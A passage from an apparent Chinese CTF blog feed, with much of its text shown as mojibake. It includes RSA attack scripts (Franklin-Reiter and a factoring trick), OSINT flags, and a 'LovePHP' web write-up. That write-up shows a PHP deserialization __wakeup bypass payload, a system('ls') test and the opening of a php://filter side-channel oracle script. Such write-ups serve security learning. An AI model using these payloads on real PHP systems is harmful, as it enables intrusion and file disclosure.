class="number">18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883</span></span><br><span class="line">c1 = <span class="number">3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520</span></span><br><span class="line">c2 = <span class="number">6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">or</span> n % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    i = <span class="number">5</span></span><br><span class="line">    <span class="keyword">while</span> i * i &lt;= n:</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span> <span class="keyword">or</span> n % (i + <span class="number">2</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        i += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (<span class="number">114</span>*x+<span class="number">2333</span>)^<span class="built_in">int</span>(e) - c1</span><br><span class="line">    g2 = (<span class="number">514</span>*x+<span class="number">4555</span>)^<span class="built_in">int</span>(e) - c2</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    <span class="keyword">if</span> is_prime(i):</span><br><span class="line">        e = i</span><br><span class="line">        m=franklinReiter(n,e,c1,c2)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes((<span class="built_in">int</span>(m))))</span><br></pre></td></tr></table></figure><p>eåº”è¯¥æ˜¯983</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195057189-1700990465941-285.png"></p><h3 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h3><p>demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#demo</span></span><br><span class="line"><span class="comment"># from secret import flag</span></span><br><span class="line"><span class="comment"># from  Crypto.Util.number import *</span></span><br><span class="line"><span class="comment"># m = bytes_to_long(flag)</span></span><br><span class="line"><span class="comment"># c = 57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line"><span class="comment"># hint1 = getPrime(13)*p+getPrime(256)*q</span></span><br><span class="line"><span class="comment"># hint2 = getPrime(13)*p+getPrime(256)*q</span></span><br><span class="line"><span class="comment"># c = pow(m,e,n)</span></span><br><span class="line"><span class="comment"># print(f&#x27;n = &#123;n&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;hint1 = &#123;hint1&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;hint2 = &#123;hint2&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;c = &#123;c&#125;&#x27;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># n = 68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067</span></span><br><span class="line"><span class="comment"># hint1 = 564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580</span></span><br><span class="line"><span class="comment"># hint2 = 484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110</span></span><br><span class="line"><span class="comment"># c = 57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd,invert</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">n = <span class="number">68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067</span></span><br><span class="line">hint1 = <span class="number">564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580</span></span><br><span class="line">hint2 = <span class="number">484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110</span></span><br><span class="line">c = <span class="number">57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">bar = tqdm(total=(<span class="number">1</span>&lt;&lt;<span class="number">12</span>)**<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x1, x2 <span class="keyword">in</span> tqdm(product(<span class="built_in">range</span>(<span class="number">1</span>&lt;&lt;<span class="number">12</span>,<span class="number">1</span>&lt;&lt;<span class="number">13</span>), repeat=<span class="number">2</span>)):</span><br><span class="line">    q = gcd(hint1*x1 -hint2*x2,n)</span><br><span class="line">    bar.update(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> q != <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = n//q</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi_n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">pow</span>(c, d, n))[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h3 id="è´­ç‰©ä¹‹æ—…"><a href="#è´­ç‰©ä¹‹æ—…" class="headerlink" title="è´­ç‰©ä¹‹æ—…"></a>è´­ç‰©ä¹‹æ—…</h3><p>SICTF{åŒ—äº¬å¸‚_é¡ºä¹‰åŒº_æ–°é¡ºå—å¤§è¡—_åŒ—äº¬åè”é¡ºä¹‰é‡‘è¡—è´­ç‰©ä¸­å¿ƒ}</p><h3 id="ç¾å¥³å§å§"><a href="#ç¾å¥³å§å§" class="headerlink" title="ç¾å¥³å§å§"></a>ç¾å¥³å§å§</h3><p>SICTF{ç¦å»ºçœç¦å·å¸‚ä»“å±±åŒºçƒŸå°å±±å…¬å›­}</p><h3 id="å®å¡”é•‡æ²³å¦–"><a href="#å®å¡”é•‡æ²³å¦–" class="headerlink" title="å®å¡”é•‡æ²³å¦–"></a>å®å¡”é•‡æ²³å¦–</h3><p>SICTF{å±±ä¸œçœæµå®å¸‚æ±¶ä¸Šå¿å¤ªå­çµè¸ªå¡”}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> èµ›äº‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023è“å¸½æ¯  åˆèµ›webé¢˜è§£ä¹‹LovePHP</title>
      <link href="/2023/09/02/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%20%20%E5%88%9D%E8%B5%9Bweb%E9%A2%98%E8%A7%A3%E4%B9%8BLovePHP/"/>
      <url>/2023/09/02/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%20%20%E5%88%9D%E8%B5%9Bweb%E9%A2%98%E8%A7%A3%E4%B9%8BLovePHP/</url>
      
        <content type="html"><![CDATA[<h1 id="2023è“å¸½æ¯-åˆèµ›webé¢˜è§£ä¹‹LovePHP"><a href="#2023è“å¸½æ¯-åˆèµ›webé¢˜è§£ä¹‹LovePHP" class="headerlink" title="2023è“å¸½æ¯  åˆèµ›webé¢˜è§£ä¹‹LovePHP"></a>2023è“å¸½æ¯  åˆèµ›webé¢˜è§£ä¹‹LovePHP</h1><p>æ¯”èµ›è¿‡å»å¥½ä¹…äº†ï¼Œæ‰æƒ³èµ·æ¥æŠŠè¿™é“é¢˜ç»™å¤ç°ä¸€ä¸‹ï¼Œå‰äº›å¤©å¿™ç€å­¦è½¦äº†ï¼Œä¹Ÿæ²¡ç©ºï¼Œæ˜å¤©å¼€å­¦äº†ï¼Œä»Šå¤©æ¥å¤ç°ä¸€ä¸‹ã€‚è¿‡äº†å¥½ä¹…ä¹Ÿæ²¡ç¯å¢ƒäº†ï¼Œåªèƒ½æ¥æœ¬åœ°è¯•è¯•äº†</p><p><img src="/2023/09/02/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%20%20%E5%88%9D%E8%B5%9Bweb%E9%A2%98%E8%A7%A3%E4%B9%8BLovePHP/image/image-20231126172215323-1700990592297-327-1701071506462-1.png" alt="image-20231126172215323"></p><p>æºç çœ‹ä¸Šå»ä¸éš¾çœ‹æ‡‚ï¼Œæœ€ä¸»è¦æœ‰ä¸¤ä¸ªè€ƒç‚¹ï¼Œfileå’Œååºåˆ—åŒ–çš„wakeupç»•è¿‡</p><p>æˆ‘ä»¬é¦–å…ˆçœ‹ä¸€ä¸ªå°å‘</p><p>ç”±äºphpå­—ç¬¦ä¸²è§£æçš„é—®é¢˜</p><p>PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</p><ul><li>åˆ é™¤ç©ºç™½ç¬¦</li><li>å°†æŸäº›å­—ç¬¦ï¼ˆ [ ç©ºæ ¼ + . ï¼‰è½¬æ¢ä¸ºä¸‹åˆ’çº¿</li></ul><p><strong>å®é™…åº”ç”¨ï¼š</strong></p><ul><li>getä¼ å‚111_aa,ä¸èƒ½ç›´æ¥ä¼ æ—¶ï¼Œä¼ 111_aaã€‚<br> &#x2F;&#x2F;phpçš„å˜é‡è§£æç»•è¿‡ï¼Œ[ è¢«å¤„ç†æˆ _</li><li>å½“[æå‰å‡ºç°åï¼Œåé¢çš„ . å°±ä¸ä¼šå†è¢«è½¬ä¹‰æˆ_äº†ã€‚</li><li>å½“è¿™äº›å­—ç¬¦ä¸ºé¦–å­—æ¯æ—¶ï¼Œåªæœ‰ç‚¹å·ä¼šè¢«æ›¿æ¢æˆä¸‹åˆ’</li></ul><p>æ‰€ä»¥è¿™ä¸ªé¢˜ä¼ å‚è¦ç”¨my[sercet.flag</p><p>çŸ¥é“äº†è¿™ä¸ªæˆ‘ä»¬å†æ¥çœ‹wakeupæ€ä¹ˆè¿‡å§ï¼Œè¿™ä¸ªé¢˜ç›®çš„phpç‰ˆæœ¬æ˜¯7.43ç‰ˆçš„ï¼Œè·Ÿé‚£ä¸ªcve-2016-7124ç‰ˆæœ¬å¯¹ä¸ä¸Šï¼Œä¸Šç½‘æœäº†ä¸€ä¸‹é«˜ç‰ˆæœ¬phpæ€ä¹ˆè®©wakeupï¼Œè¦ç”¨Cç»•è¿‡<strong>C:8:â€Safermanâ€:0:{}</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬åœ°è°ƒè¯•</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saferman</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span> = True;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check === True)&#123;</span><br><span class="line">            <span class="comment">/*file(file_put_contents(&#x27;php://filter/write=convert.base64-decode/resource=1.txt&#x27;,&#x27;PD9waHAgcGhwaW5mbygpOz8+&#x27;));</span></span><br><span class="line"><span class="comment">            var_dump(file(&#x27;data://text/plain,&lt;?php system(\&#x27;ls\&#x27;);?&gt;&#x27;));*/</span></span><br><span class="line">            <span class="comment">//file(eval(&#x27;system(&quot;dir&quot;);&#x27;));</span></span><br><span class="line">            <span class="title function_ invoke__">file</span>(<span class="string">&#x27;&lt;?php eval(\&#x27;system(\&#x27;ls\&#x27;)\&#x27;)?&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check=False;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//phpinfo();</span></span><br><span class="line"> <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;C:8:&quot;Saferman&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/09/02/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%20%20%E5%88%9D%E8%B5%9Bweb%E9%A2%98%E8%A7%A3%E4%B9%8BLovePHP/image/image-20231126172304494-1700990592297-328-1701071506462-2.png" alt="image-20231126172304494"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playloadï¼š?my[secret.flag=C:8:&quot;Saferman&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€ç»•è¿‡file</p><p><code>file()</code>å‡½æ•°è¯»å–æ–‡ä»¶åæŠŠå†…å®¹å‚¨å­˜åˆ°æ•°ç»„ä¸­ï¼Œå¹¶ä¸å›æ˜¾ï¼Œæœ€åæ‰¾åˆ°ä¸¤ç¯‡æ–‡ç« å€Ÿé‰´</p><p><a href="https://blog.zeddyu.info/2022/09/27/2022-09-28-TheEndOfAFR/">https://blog.zeddyu.info/2022/09/27/2022-09-28-TheEndOfAFR/</a></p><p><a href="https://boogipop.com/2023/05/08/Web%E4%BE%A7%E4%BF%A1%E9%81%93%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/">https://boogipop.com/2023/05/08/Web%E4%BE%A7%E4%BF%A1%E9%81%93%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/</a></p><p><strong>ä¾§ä¿¡é“æ”»å‡»</strong>   ä¾§ä¿¡é“å…¶å®å°±æ˜¯æ ¹æ®ä¸€ä¸ªäºŒå…ƒæˆ–è€…å¤šå…ƒæ¡ä»¶å…³ç³»å·®ï¼Œå¯ä»¥è®©æˆ‘ä»¬ä»¥â€ç›²æ³¨â€çš„å½¢å¼ï¼Œå»è·å–æŸäº›ä¿¡æ¯çš„ä¸€ç§æ–¹æ³•ï¼Œæµ‹ä¿¡é“å¹¿ä¹‰ä¸Šæ˜¯éå¸¸å¹¿æ³›çš„ã€‚åœ¨webé¢˜ç›®ä¸­ä»–ä»¬é€šå¸¸ä»¥ç›²æ³¨çš„å½¢å¼å‡ºç°ã€‚è€Œè¿™é‡Œçš„fileå‡½æ•°é‡Œé¢æ˜¯å¯ä»¥ç”¨filterä¼ªåè®®çš„</p><p>å¾—åˆ°äº†ä¸€ä¸ªä¾§ä¿¡é“æ”»å‡»è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">THE GRAND IDEA:</span></span><br><span class="line"><span class="string">We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE</span></span><br><span class="line"><span class="string">filter will blow up the string length by 4x every time it is used, which will quickly cause</span></span><br><span class="line"><span class="string">500 error if and only if the string is non empty. So we now have an oracle that tells us if</span></span><br><span class="line"><span class="string">the string is empty.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">THE GRAND IDEA 2:</span></span><br><span class="line"><span class="string">The dechunk filter is interesting.</span></span><br><span class="line"><span class="string">https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724</span></span><br><span class="line"><span class="string">It looks like it was implemented for something http related, but for our purposes, the interesting</span></span><br><span class="line"><span class="string">behavior is that if the string contains no newlines, it will wipe the entire string if and only if</span></span><br><span class="line"><span class="string">the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our</span></span><br><span class="line"><span class="string">above oracle! In fact we can verify that since the flag starts with D that the filter chain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 